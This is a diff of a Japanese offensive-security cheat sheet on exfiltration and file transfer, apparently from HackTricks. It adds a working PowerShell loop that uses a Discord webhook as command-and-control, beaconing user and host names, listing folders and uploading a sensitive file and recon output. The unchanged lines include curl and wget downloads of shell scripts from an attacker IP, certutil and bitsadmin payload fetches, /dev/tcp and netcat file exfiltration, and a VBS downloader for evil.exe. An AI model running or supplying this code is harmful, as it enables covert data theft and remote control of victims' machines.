@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 情報を抽出するための一般的にホワイトリストに登録されたドメイン
+## 情報をexfiltrateするために一般的にホワイトリスト化されているドメイン
 
-[https://lots-project.com/](https://lots-project.com/) を確認して、悪用できる一般的にホワイトリストに登録されたドメインを見つけてください。
+悪用可能な一般的にホワイトリスト化されているドメインを見つけるには [https://lots-project.com/](https://lots-project.com/) を確認してください
 
 ## Copy\&Paste Base64
 
@@ -13,7 +13,7 @@
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**ウィンドウズ**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -27,7 +27,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**ウィンドウズ**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -45,7 +45,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### ファイルのアップロード
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**GETおよびPOST（ヘッダーも含む）を印刷するSimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -59,7 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPSサーバー**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,9 +100,94 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) を C2 と Data Exfiltration に利用
+
+Webhooks は、JSON と任意の file parts を受け取る書き込み専用の HTTPS エンドポイントです。一般に信頼された SaaS ドメインで許可され、OAuth/API keys を必要としないため、低摩擦の beaconing と exfiltration に便利です。
+
+Key ideas:
+- エンドポイント: Discord は https://discord.com/api/webhooks/<id>/<token> を使用
+- POST multipart/form-data で、payload_json というパートに {"content":"..."} を含め、任意の file パート（name は file）を添付
+- オペレータループパターン: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK が配信を確認
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+注意:
+- 同様のパターンは、incoming webhooks を使用する他のコラボレーションプラットフォーム（Slack/Teams）にも当てはまります。URL と JSON schema を適宜調整してください。
+- Discord Desktop のキャッシュアーティファクトの DFIR と webhook/API の復元については、次を参照してください：
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTPサーバー (python)
+### FTP サーバー (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -112,7 +197,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTPサーバー (pure-ftp)
+### FTP サーバ (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Or create a smb share **using samba**:
+または smb share を **samba を使用して** 作成する:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -165,7 +250,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-ウィンドウズ
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-攻撃者はSSHdを実行している必要があります。
+The attackerはSSHdを実行している必要がある。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-もし被害者がSSHを持っている場合、攻撃者は被害者のディレクトリを攻撃者にマウントすることができます。
+victimがSSHを使える場合、attackerはvictimのディレクトリをattacker側にマウントできます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,7 +279,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 被害者からファイルをダウンロードする
+### 被害者からファイルをダウンロード
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -206,7 +291,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_** に感謝します
+感謝: **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,33 +313,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます:
+SMTPサーバーにデータを送信できる場合、pythonでデータを受信するSMTPサーバを作成できます:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-デフォルトでは、XPおよび2003では（他のバージョンではインストール中に明示的に追加する必要があります）
+XP と 2003 ではデフォルトで有効です（その他の環境ではインストール時に明示的に追加する必要があります）
 
-Kaliで、**TFTPサーバーを開始**:
+Kali では、**TFTP サーバーを起動する**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**PythonによるTFTPサーバー:**
+**TFTPサーバー (pythonで):**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**被害者**で、Kaliサーバーに接続します:
+**victim** で Kali サーバーに接続する:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHPのワンライナーを使ってファイルをダウンロードする:
+PHP onelinerを使ってファイルをダウンロード:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -262,7 +347,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**犠牲者**
+**被害者**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -296,18 +381,26 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` プログラムはバイナリの検査だけでなく、**16進数からそれらを再構築する能力**も持っています。これは、バイナリの16進数を提供することで、`debug.exe` がバイナリファイルを生成できることを意味します。ただし、debug.exe には**最大64 kbのサイズのファイルをアセンブルする制限**があることに注意することが重要です。
+`debug.exe` プログラムは、binaries の解析だけでなく、**hex から再構築する機能**も備えています。つまり、binary の hex を与えることで、`debug.exe` はその binary ファイルを生成できます。
+
+ただし、debug.exe は **64 kb までのファイルしかアセンブルできない制限**があることに注意してください。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-その後、テキストをウィンドウズシェルにコピー＆ペーストすると、nc.exeというファイルが作成されます。
+その後、テキストを windows-shell にコピー＆ペーストすると、nc.exe というファイルが作成されます。
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## References
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
